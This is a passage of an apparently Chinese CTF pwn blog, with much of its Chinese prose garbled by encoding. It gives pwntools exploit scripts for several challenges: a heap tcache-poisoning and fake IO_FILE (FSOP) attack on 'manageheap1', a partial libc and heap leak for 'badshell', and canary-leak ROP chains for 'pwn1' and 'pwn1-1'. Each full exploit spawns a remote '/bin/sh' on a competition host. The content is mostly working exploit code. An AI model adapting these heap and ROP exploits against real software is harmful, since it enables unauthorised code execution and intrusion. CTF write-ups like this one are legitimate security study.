class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./manageheap1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#elf = ELF(challenge)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"><span class="comment">#cmd += &quot;b *$rebase(0x1868)\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge,cmd)</span></span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;172.16.159.33&#x27;</span>,<span class="string">&#x27;58012&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">i</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your Choice: &quot;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">number,name,<span class="built_in">id</span></span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;please input your major&#x27;s number:&quot;</span>,<span class="built_in">str</span>(number))</span><br><span class="line">    p.sendafter(<span class="string">&quot;please input your name:&quot;</span>,name)</span><br><span class="line">    p.sendafter(<span class="string">&quot;&gt; \n&quot;</span>,<span class="built_in">id</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input your idx:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input your idx:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,<span class="built_in">id</span></span>):</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input your idx:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;please input your id:&quot;</span>,<span class="built_in">id</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x7</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>*<span class="number">0x7</span>)</span><br><span class="line">add(<span class="number">0x7</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>*<span class="number">0x7</span>)</span><br><span class="line">add(<span class="number">0x7</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>*<span class="number">0x7</span>)</span><br><span class="line">add(<span class="number">0x7</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>*<span class="number">0x7</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>*<span class="number">0x7</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>*<span class="number">0x7</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>*<span class="number">0x7</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0x31</span>))</span><br><span class="line">p.send(p64(<span class="number">0x621</span>))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>,<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;aaaaaaaaaaaaaaaa&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr-<span class="number">0x3f0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Member: &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x21a10a</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">IO_list_all = libc_base + libc.sym[<span class="string">&quot;_IO_list_all&quot;</span>]</span><br><span class="line">_IO_wfile_jumps = libc_base + libc.sym[<span class="string">&quot;_IO_wfile_jumps&quot;</span>]</span><br><span class="line">libc_puts = libc_base + libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;IO_list_all &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(IO_list_all))</span><br><span class="line">success(<span class="string">&quot;_IO_wfile_jumps &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(_IO_wfile_jumps))</span><br><span class="line"></span><br><span class="line">main_arena1 = libc_base + <span class="number">0x219c0a</span></span><br><span class="line">main_arena2 = libc_base + <span class="number">0x219ce0</span></span><br><span class="line">success(<span class="string">&quot;main_arena1 &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(main_arena1))</span><br><span class="line">success(<span class="string">&quot;main_arena2 &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(main_arena2))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">pop_rdx_rbx_ret = libc_base + <span class="number">0x0000000000090529</span></span><br><span class="line"></span><br><span class="line">key = heap_base // <span class="number">0x1000</span></span><br><span class="line">success(<span class="string">&quot;key &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line">success(<span class="string">&quot;IO_list_all^key &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(IO_list_all^key))</span><br><span class="line"></span><br><span class="line">one_gadgets = [<span class="number">0x50a37</span>,<span class="number">0xebcf1</span>,<span class="number">0xebcf5</span>,<span class="number">0xebcf8</span>]</span><br><span class="line">one_gadget = one_gadgets[<span class="number">0</span>] + libc_base</span><br><span class="line">libc_system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;one_gadget &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line">success(<span class="string">&quot;libc_system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_system))</span><br><span class="line"></span><br><span class="line">target_chunk = heap_base + <span class="number">0x340</span></span><br><span class="line">target = target_chunk ^ key</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(target))</span><br><span class="line">p.sendline(p64(IO_list_all^key))</span><br><span class="line"></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_io_addr = heap_base + <span class="number">0x430</span> </span><br><span class="line">payload_addr = heap_base</span><br><span class="line">flag_addr = heap_base</span><br><span class="line"></span><br><span class="line">fake_IO_FILE =  <span class="string">&quot;/bin/sh\x00&quot;</span>         <span class="comment">#_flags=rdi</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="comment"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE += p64(payload_addr-<span class="number">0xa0</span>)<span class="comment">#_IO_backup_base=rdx</span></span><br><span class="line">fake_IO_FILE += p64(libc_system)<span class="comment">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(flag_addr)  <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x30</span>)<span class="comment">#_wide_data,rax1_addr</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0xb0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="comment">#mode=1</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0xc8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(_IO_wfile_jumps+<span class="number">0x30</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)  <span class="comment"># rax2_addr</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&quot;cccccccc&quot;</span>,fake_IO_FILE)</span><br><span class="line">add(<span class="number">6</span>,<span class="string">&quot;cccccccc&quot;</span>,<span class="string">&quot;cccccccc&quot;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="string">&quot;cccc&quot;</span>,p64(fake_io_addr))</span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;please input your major&#x27;s number:&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;please input your name:&quot;</span>,<span class="string">&quot;win&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>PSÔºöËèúÈ∏° pwn ÊâãÁöÑÁ¨¨‰∏Ä‰∏™3Ë°Ä</p>
<h2 id="badshell"><a href="#badshell" class="headerlink" title="badshell"></a>badshell</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.9</span>)</span> stable release version 2.31.\n</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">badshell: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=<span class="number">7b</span>723a1405c35735c73c5600c68ee2c53b2a1f33, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64‰ΩçÔºådynamicallyÔºåÂÖ®ÂºÄ</li>
</ul>
<p><strong>ÂÖ•‰æµÊÄùË∑Ø</strong></p>
<p>Êú¨È¢òÁõÆÊ≤°ÊúâÂÅöÂá∫Êù•ÔºåÊØîËµõÊó∂Ê≤°ÊúâÊó∂Èó¥ÂÅö‰∫ÜÔºåËµõÂêéÂ§çÁé∞Êâæ‰∏çÂà∞ wp ‰πüÂæàÂ§¥Áóõ</p>
<p>cpp ÁöÑÂ†ÜÁéØÂ¢ÉÂæà‰π±ÔºåÂπ∂‰∏îÈÄÜÂêëÂá∫Êù•‰πüÂæàÈöæÁúãÔºåÊöÇÊó∂Ê≤°ÊúâÊâæÂà∞ÊºèÊ¥ûÁÇπÔºå‰ΩÜÈÄöËøáÈÅóÁïôÂú® unsorted chunk ‰∏≠ÁöÑ main_arena ÊåáÈíàÔºåÂíåÈÅóÁïôÂú® tcache chunk ‰∏≠ÁöÑ next ÊåáÈíàÔºåÂèØ‰ª•ÂÆåÊàêÊ≥ÑÈú≤</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">touch(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">touch(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">mkdir(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">echo(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;p&quot;</span>*<span class="number">0x780</span>)</span><br><span class="line">echo(<span class="string">&quot;2&quot;</span>,<span class="string">&quot;c&quot;</span>)</span><br><span class="line">cat(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ed063</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line">echo(<span class="string">&quot;2&quot;</span>,<span class="string">&quot;c&quot;</span>*<span class="number">0x11</span>)</span><br><span class="line">cat(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;c&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x12a63</span> </span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure>
<p>‰ΩÜÁ®ãÂ∫èÂè™Ë¶ÅÊâßË°åËøá‰∏ÄÊ¨° <code>echo</code> ÂêéÔºàÂøÖÈ°ªÊàêÂäüÂÜôÂÖ•Êï∞ÊçÆÔºâÔºåÂÜçÊ¨°ÊâßË°å <code>touch</code> Âíå <code>mkdir</code> ÈÉΩ‰ºöÊä•Èîô</p>
<p>ÊöÇÊó∂Âè™ËÉΩÂÆåÊàêÊ≥ÑÈú≤‰∫ÜÔºåÊâæ‰∏çÂà∞ÊºèÊ¥ûÁÇπ</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/13/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81CTF2022/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PwnËøõ‰Ω†ÁöÑÂøÉ">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/13/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81CTF2022/" class="post-title-link" itemprop="url">Âº∫ÁΩëÊãüÊÄÅCTF2022</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-11-13 17:50:51" itemprop="dateCreated datePublished" datetime="2022-11-13T17:50:51+08:00">2022-11-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-12-19 18:00:58" itemprop="dateModified" datetime="2022-12-19T18:00:58+08:00">2022-12-19</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>25k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>23 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="pwn1-pwn1-1-pwn2-1"><a href="#pwn1-pwn1-1-pwn2-1" class="headerlink" title="pwn1 ~ pwn1-1 ~ pwn2-1"></a>pwn1 ~ pwn1-1 ~ pwn2-1</h2><p>Ëøô3‰∏™È¢òÊØîËæÉÁÆÄÂçïÔºåÂ∞±Áõ¥Êé•Êîæ exp ‰∫ÜÔºö</p>
<p><strong>pwn1</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./pwn1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.27.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;172.51.221.145&#x27;</span>, <span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b* \n&quot;)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0xB19)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;You will find some tricks\n&quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">proc_base = leak_addr - <span class="number">0xA94</span></span><br><span class="line">system = <span class="number">0xA2C</span> + proc_base</span><br><span class="line">binsh = <span class="number">0x202068</span> + proc_base</span><br><span class="line">pop_rdi = <span class="number">0x0000000000000c73</span> + proc_base</span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;proc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(proc_base))</span><br><span class="line">success(<span class="string">&quot;system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">payload = <span class="string">&quot;%33$p&quot;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;hello\n&quot;</span>)</span><br><span class="line">canary = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">success(<span class="string">&quot;canary &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">200</span> + p64(canary) + p64(<span class="number">0</span>) + p64(pop_rdi) + p64(binsh) + p64(system)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><strong>pwn1-1</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./pwn1-1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.27.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;172.51.221.131&#x27;</span>,<span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b* \n&quot;)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x153C)\nb *$rebase(0x1423)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;You will find some tricks\n&quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">proc_base = leak_addr - <span class="number">0x12a0</span></span><br><span class="line">system = <span class="number">0x11A2</span> + proc_base</span><br><span class="line">binsh = <span class="number">0x4050</span>+ proc_base</span><br><span class="line">pop_rdi = <span class="number">0x0000000000001943</span> + proc_base</span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;proc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(proc_base))</span><br><span class="line">success(<span class="string">&quot;system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;b&#x27;</span>*(<span class="number">0xd0</span>) + p64(proc_base + <span class="number">0x4060</span> )</span><br><span class="line">payload = payload.ljust(<span class="number">0xd0</span>-<span class="number">1</span>,<span class="string">&quot;a&quot;</span>)+p64(proc_base + <span class="number">0x4060</span>)*<span class="number">4</span>+ p64(pop_rdi) + p64(binsh) + p64(system)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><strong>pwn2-1</strong></p>
